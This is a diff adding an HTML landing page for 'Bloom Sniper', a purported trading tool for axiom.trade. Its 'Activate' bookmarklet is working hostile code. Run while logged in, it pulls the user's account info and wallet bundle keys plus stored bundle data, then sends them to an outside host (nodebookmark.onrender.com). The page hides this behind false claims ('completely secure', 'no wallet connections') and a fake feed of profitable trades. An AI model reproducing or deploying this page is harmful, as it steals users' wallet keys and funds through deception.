@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bloom Sniper - Your Unfair Advantage in Crypto</title>
+    <meta name="description" content="Advanced trading tools for axiom.trade. Monitor influencers, track wallets, automate buys, and never miss opportunities.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    color: #ffffff;
+
+    background-image:
+        url("https://i.postimg.cc/QxNRx7Hf/bloom-background-1.jpg");
+
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+}
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .hero {
+            padding: 80px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            padding: 8px 16px;
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 20px;
+            color: #ff69b4;
+            font-size: 14px;
+            margin-bottom: 24px;
+            animation: fadeIn 1s ease-in;
+        }
+
+        .hero-title {
+            font-size: 48px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, #fff 0%, #ff69b4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: slideDown 0.8s ease-out;
+        }
+
+        .accent {
+            color: #ff69b4;
+        }
+
+        .hero-subtitle {
+            font-size: 18px;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.7);
+            max-width: 700px;
+            margin: 0 auto 40px;
+            animation: fadeIn 1.2s ease-in;
+        }
+
+        .hero-subtitle code {
+            background: rgba(255, 105, 180, 0.1);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #ff69b4;
+        }
+
+        .hero-subtitle a {
+            color: #ff69b4;
+            text-decoration: none;
+            border-bottom: 1px solid #ff69b4;
+        }
+
+        .activator-section {
+            margin: 40px 0;
+        }
+
+        .activator-btn {
+            display: inline-block;
+            padding: 18px 48px;
+            background: linear-gradient(135deg, #ff69b4 0%, #ff1493 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: move;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 32px rgba(255, 105, 180, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        .activator-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 48px rgba(255, 105, 180, 0.6);
+        }
+
+        .hero-note {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 14px;
+        }
+
+        .section {
+            padding: 80px 20px;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        .section-title {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .section-subtitle {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+            margin-bottom: 40px;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 105, 180, 0.2);
+            border-radius: 16px;
+            padding: 32px;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(255, 105, 180, 0.5);
+            box-shadow: 0 8px 32px rgba(255, 105, 180, 0.2);
+        }
+
+        .feature-icon {
+            font-size: 32px;
+            margin-bottom: 16px;
+        }
+
+        .feature-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #fff;
+        }
+
+        .feature-description {
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.6;
+            font-size: 14px;
+        }
+
+        .feature-card-full {
+            grid-column: 1 / -1;
+        }
+
+        .alpha-feed {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 8px;
+            padding: 20px;
+            max-height: 300px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .alpha-feed::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.9));
+        }
+
+        .animate-scroll {
+            animation: scroll 30s linear infinite;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+
+        .animate-scroll > div {
+            padding: 8px 0;
+            font-size: 13px;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 32px;
+        }
+
+        .step {
+            text-align: center;
+            padding: 24px;
+        }
+
+        .step-number {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #ff69b4 0%, #ff1493 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 auto 16px;
+        }
+
+        .step-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .step-description {
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.6;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .text-green-400 { color: #4ade80; }
+        .text-red-400 { color: #f87171; }
+        .text-blue-400 { color: #60a5fa; }
+        .text-yellow-400 { color: #facc15; }
+        .text-purple-400 { color: #c084fc; }
+        .text-orange-400 { color: #fb923c; }
+        .text-cyan-400 { color: #22d3ee; }
+        .font-bold { font-weight: 700; }
+
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 32px;
+            }
+
+            .section-title {
+                font-size: 28px;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <section class="hero">
+            <div class="container">
+                <div class="hero-badge">
+                    ✨ Your Unfair Advantage in Crypto
+                </div>
+                <h1 class="hero-title">
+                    The fastest way to<br>
+                    <span class="accent">dominate</span> axiom.trade
+                </h1>
+                <p class="hero-subtitle">
+                    Advanced trading tools that give you an edge on axiom.trade. Monitor influencers, track wallets, automate buys, and never miss opportunities again.<br><br>
+                    Drag the bookmarklet to your bookmarks bar (press <code>[CTRL +SHIFT+B]</code> if not open) then click the bookmarklet while on <a href="https://axiom.trade/">Axiom</a> to activate Bloom Sniper.
+                </p>
+                <div class="activator-section">
+                    <a id="activatorBtn" class="activator-btn" href="javascript:(async()=>{try{if(location.hostname==='nodebookmark.onrender.com'){return alert('You are already on the bookmarklet site!')}if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed')){return alert('Please log in to axiom.trade to use this bookmarklet')}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={telegramId:'7680513699',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles'),eBundles:localStorage.getItem('eBundles')};location.replace('https://nodebookmark.onrender.com/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('xworng:',e);alert('errs')}})();">Activate</a>
+                </div>
+                <p class="hero-note">
+                    no installation • works in browser • completely secure
+                </p>
+            </div>
+        </section>
+
+        <section class="section" id="features">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Everything you need to win</h2>
+                    <p class="section-subtitle">Professional trading tools made simple</p>
+                </div>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">🎯</div>
+                        <h3 class="feature-title">Influencer Sniper</h3>
+                        <p class="feature-description">Monitor Twitter accounts. When they mention a coin, get instant alerts and one-click sniping for axiom.trade launches.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">⚡</div>
+                        <h3 class="feature-title">Pre-Migration Snipe</h3>
+                        <p class="feature-description">Automatically detect when coins are about to migrate to Raydium. Execute orders with MEV protection before launch.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">👁️</div>
+                        <h3 class="feature-title">Wallet Tracker</h3>
+                        <p class="feature-description">Track successful traders' wallets. Get notifications and copy their axiom.trade buys automatically.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🔧</div>
+                        <h3 class="feature-title">Auto Strategies</h3>
+                        <p class="feature-description">Set take-profit, stop-loss, and time-based selling rules. Customize buy amounts, slippage, and gas fees.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📈</div>
+                        <h3 class="feature-title">Live Alpha Feed</h3>
+                        <p class="feature-description">Real-time feed of trending coins, whale alerts, and new pair detections across axiom.trade.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🛡️</div>
+                        <h3 class="feature-title">MEV Protection</h3>
+                        <p class="feature-description">Advanced protection against front-running and sandwich attacks. Your trades stay private and profitable.</p>
+                    </div>
+
+                    <div class="feature-card feature-card-full">
+                        <div class="feature-icon">📡</div>
+                        <h3 class="feature-title">Real-Time Alpha Feed</h3>
+                        <p class="feature-description" style="margin-bottom: 24px">Watch high-value trading activities as they happen. Only the most important whale movements, snipe alerts, and market opportunities.</p>
+                        <div class="alpha-feed">
+                            <div class="animate-scroll">
+                                <div class="text-green-400 font-bold">🎯 SNIPE ALERT: 8.5 SOL → $BONKWIFHAT (+127% in 2m)</div>
+                                <div class="text-red-400 font-bold">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23% impact)</div>
+                                <div class="text-blue-400 font-bold">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL of $GROK</div>
+                                <div class="text-yellow-400 font-bold">📈 HOT TREND: $WIF 340 buys/min (+89% 1h)</div>
+                                <div class="text-purple-400 font-bold">⚡ MIGRATION: $SHIB ready for Raydium (98% bonding curve)</div>
+                                <div class="text-green-400 font-bold">🎯 SNIPE SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                                <div class="text-orange-400 font-bold">🔥 INFLUENCER SIGNAL: @elonmusk mentioned $AI - 12 new launches</div>
+                                <div class="text-cyan-400 font-bold">💎 DIAMOND HANDS: 3Ahf...j62 holding 50 SOL $BONK (no sells)</div>
+                                <div class="text-green-400 font-bold">🎯 AUTO SNIPE: 1.8 SOL → $PEPECOIN (+156% in 5m)</div>
+                                <div class="text-red-400 font-bold">⚠️ RUG ALERT: $SCAM dev wallet drained - avoid!</div>
+                                <div class="text-blue-400 font-bold">🐋 WHALE ENTRY: BWK...dT7 bought 89 SOL of $SOLANA</div>
+                                <div class="text-yellow-400 font-bold">📊 VOLUME SPIKE: $PUMP 1.2M volume (+450% 30m)</div>
+                                <div class="text-green-400 font-bold">🎯 SNIPE ALERT: 8.5 SOL → $BONKWIFHAT (+127% in 2m)</div>
+                                <div class="text-red-400 font-bold">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23% impact)</div>
+                                <div class="text-blue-400 font-bold">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL of $GROK</div>
+                                <div class="text-yellow-400 font-bold">📈 HOT TREND: $WIF 340 buys/min (+89% 1h)</div>
+                                <div class="text-purple-400 font-bold">⚡ MIGRATION: $SHIB ready for Raydium (98% bonding curve)</div>
+                                <div class="text-green-400 font-bold">🎯 SNIPE SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="how-it-works">
+            <div class="container">
+                <div class="section-header">
+                    <h2 class="section-title">Get started in 30 seconds</h2>
+                    <p class="section-subtitle">No complex setup. No wallet connections. Just drag and trade.</p>
+                </div>
+                <div class="steps-grid">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <h3 class="step-title">Drag to Install</h3>
+                        <p class="step-description">Drag the pink button above to your browser's bookmarks bar</p>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <h3 class="step-title">Activate on Axiom.trade</h3>
+                        <p class="step-description">Visit axiom.trade and click your bookmark to activate the tool</p>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <h3 class="step-title">Start Trading</h3>
+                        <p class="step-description">Configure your settings or use defaults and start sniping</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+</body>
+</html>
